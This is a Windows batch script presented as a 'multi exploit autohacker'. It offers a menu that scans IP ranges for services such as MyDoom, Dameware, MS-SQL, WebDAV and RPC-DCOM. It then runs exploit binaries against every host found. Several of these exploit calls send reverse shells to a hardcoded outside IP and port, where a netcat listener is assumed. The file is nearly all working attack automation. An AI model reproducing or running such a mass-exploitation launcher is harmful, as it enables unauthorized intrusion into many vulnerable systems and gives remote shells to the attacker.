:start
@echo off
break on
mode 80
echo.
cls
echo *******************************************
echo  *         multi exploit hacker          *
echo  *             Coded by w00d             *
echo *******************************************
echo.
set /p c=Welcome to Multi Exploit AutoHacker, Press the Enter key to continue... 
cls


echo ****************************************************
echo *          multi exploit hacker menu               *
echo *                                                  *
echo ****************************************************          
echo *- Hacking                                         *
echo *                                                  *
echo * 1) Hacking MyDoom                                * 
echo * 2) Hacking ms-0349 XP Sp0 ( press "2a" for Sp1 ) *
echo * 3) Hacking Dameware                              *
echo * 4) Hacking MS-SQL                                *
echo * 5) Hacking Webdav                                *
echo * 6) Hacking RPC-DCOM XP ( press "6a" for Win2k )  *
echo *                                                  *
echo *==================================================*
echo *- Scanning                                        *
echo *                                                  *
echo * smd) Scan for Mydoom ( port 3127 )               *
echo *  xp) Scan for Windows XP ( port 5000 )           *
echo * rpc) Scan for RPC-DCOM                           *
echo * sdw) Scan for Damewre ( port 6129 )              *
echo * sql) Scan for MS-SQL ( port 1433 )               *
echo * dav) Scan for Webdav ( IIS 5.0 )                 *
echo * del) Deletes scan.txt                            *
echo *                                                  *
echo * X) Exit                                          *
echo *                                                  *
echo ****************************************************


echo.
:choice
set /p c=Make a choice: 


if "%C%"=="1" goto 1
if "%C%"=="2" goto 2
if "%C%"=="2a" goto 2a
if "%C%"=="3" goto 3
if "%C%"=="4" goto 4
if "%C%"=="5" goto 5
if "%C%"=="6" goto 6
if "%C%"=="6a" goto 6a
if "%C%"=="del" goto del
if "%C%"=="smd" goto scan_mydoom
if "%C%"=="sdw" goto scan_dame
if "%C%"=="sql" goto scan_mssql
if "%C%"=="dav" goto scan_webdav
if "%C%"=="xp" goto scan_xp
if "%C%"=="rpc" goto scan_rpc
if "%C%"=="x" goto exit

:1
cls
If "scan.txt" =="" GoTo end
@echo.
@echo running MyDoom.a exploiter
@echo assumes preconfigured shellcode and nc setup
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do mykralor.exe %%1 3127 hs.exe
@echo.
@echo Done
@echo off
pause
goto :start


:2
cls
@echo running 0349 exploit - xp sp0
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do 0349dng %%1
@echo Done
pause
goto :start


:2a
cls
@echo running 0349 exploit - xp sp1
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do 0349dng1 %%1
@echo Done
pause
goto :start


:3
cls
@echo running Dameware exploit
@echo.
@echo this assumes a netcat listner on ip/port
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do dameweird %%1 24.17.158.137 9999
@echo Done
pause
goto :start


:4
cls
@echo running MS-SQL exploit sp1
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do sql2 %%1 24.17.158.137 9999 1
@echo Done
pause
goto :start


:5
cls
@echo running IIS 5.0 Webdav exploit
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do webdav %%1 24.17.158.137 9999
@echo Done
pause
goto :start

:6
cls
@echo running RPC-DCOM XP Universal
@echo.
@echo on
for /f "eol=; tokens=1*" %%1 in (scan.txt) do universal 5 %%1
@echo off
@echo Done
pause
goto :start

:6a
cls
@echo running RPC-DCOM XP Universal
@echo.
for /f "eol=; tokens=1*" %%1 in (scan.txt) do universal 0 %%1
@echo Done
pause
goto :start



:scan_mydoom
cls
echo +-------------------------------------------+
echo ¦        Scan for ( mydoom port 3127 )      ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -p 3127 %startip% %endip%
@echo.
@echo Done
pause
goto :start


:scan_dame
cls
echo +-------------------------------------------+
echo ¦        Scan for ( Dameware 6129 )         ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -p 6129 %startip% %endip%
@echo.
@echo Done
pause
goto :start



:scan_mssql
cls
echo +-------------------------------------------+
echo ¦        Scan for ( MS-SQL 1433 )           ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -p 1433 %startip% %endip%
@echo.
@echo Done
pause
goto :start



:scan_webdav
cls
echo +-------------------------------------------+
echo ¦        Scan for ( IIS 5.0 webdav )        ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -webdav %startip% %endip%
@echo.
@echo Done
pause
goto :start


:scan_xp
cls
echo +-------------------------------------------+
echo ¦        Scan for ( Windows XP )            ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -p 5000 %startip% %endip%
@echo.
@echo Done
pause
goto :start


:scan_rpc
cls
echo +-------------------------------------------+
echo ¦        Scan for ( RPC-DCOM )            ¦
echo +-------------------------------------------+
echo.
@echo off
set /p startip=Start-ip : 
set /p endip=End-ip : 
@echo.
scan.exe -p 135 %startip% %endip%
@echo.
@echo Done
pause
goto :start


:del
@echo off
type lastscan.txt >> allscans.txt
del lastscan.txt
echo Are you sure?
choice
move scan.txt lastscan.txt
goto :start

:exit
@echo off
exit
goto :start


:end
@echo off
pause
goto :start

rem this was hard work